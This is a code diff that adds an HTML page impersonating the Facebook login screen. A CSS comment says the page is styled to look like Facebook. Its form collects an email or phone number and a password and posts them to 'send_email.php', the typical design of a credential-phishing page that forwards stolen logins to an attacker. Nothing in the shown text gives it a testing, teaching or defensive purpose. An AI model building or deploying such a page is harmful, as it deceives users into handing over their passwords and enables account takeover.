@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Login</title>
+    <style>
+        /* Add some styling to make it look like the Facebook login page */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #3b5998;
+        }
+        .container {
+            width: 300px;
+            padding: 20px;
+            margin: 70px auto;
+            background-color: #fff;
+            border-radius: 5px;
+        }
+        .container h2 {
+            color: #3b5998;
+            margin-top: 0;
+        }
+        .container form {
+            margin-top: 20px;
+        }
+        .container input[type="text"], .container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .container input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #3b5998;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Facebook</h2>
+        <form action="send_email.php" method="post">
+            <input type="text" name="user" placeholder="Email or phone number" required>
+            <input type="password" name="pass" placeholder="Password" required>
+            <input type="submit" value="Log In">
+        </form>
+    </div>
+</body>
+</html>
